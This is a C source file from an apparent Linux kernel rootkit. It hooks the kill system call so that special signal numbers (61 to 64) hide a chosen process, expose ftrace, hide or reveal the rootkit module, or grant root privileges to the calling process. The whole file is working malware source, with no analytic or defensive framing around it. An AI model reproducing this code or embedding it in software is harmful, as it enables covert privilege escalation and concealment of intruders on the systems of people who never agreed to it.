//
// Created by sciver on 10/17/22.
//

#include "hook_kill.h"
#include "hide_module.h"
#include "setroot.h"
#include "reveal_ftrace.h"
#include "hide_process.h"
asmlinkage long (*orig_kill)(const struct pt_regs *);
asmlinkage int hook_kill(const struct pt_regs *regs)
{
    int sig = regs->si;
    int pid = regs->di;

    switch (sig) {
        case 61:
            /* If we receive the magic signal, then we just sprintf the pid
         * from the intercepted arguments into the hide_pid string */
            printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
            sprintf(hide_pid, "%d", pid);
            return 0;
            break;
        case 62:
            printk(KERN_INFO "rootkit: reavealing ftrace!\n");
            reveal_ftrace();
            return 0;
            break;
        case 63:
            if (hidden == 0) {
                printk(KERN_INFO "rootkit: hiding rootkit!\n");
                hideme();
                hidden = 1;
            } else if (hidden == 1) {
                printk(KERN_INFO "rootkit: revealing rootkit!\n");
                showme();
                hidden = 0;
            }
            return 0;
            break;
        case 64:
            printk(KERN_INFO "rootkit: giving root...\n");
            set_root();
            return 0;
            break;
    }
    return orig_kill(regs);
}